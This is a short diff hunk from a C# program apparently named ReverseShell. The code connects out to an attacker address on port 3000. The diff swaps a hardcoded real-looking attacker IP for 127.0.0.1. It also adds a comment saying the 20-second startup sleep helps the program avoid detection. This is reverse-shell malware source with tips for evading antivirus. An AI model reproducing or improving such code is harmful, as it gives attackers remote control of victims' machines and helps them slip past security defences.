@@ -186,11 +186,11 @@ class ReverseShell
 
     static void Main()
     {
-        Thread.Sleep(20000);
+        Thread.Sleep(20000); //deleting this might make it become detected, you can edit the time 
         b();
         a();
 
-        string attackerIP = "86.92.186.238";
+        string attackerIP = "127.0.0.1";
         int attackerPort = 3000;
 
         try
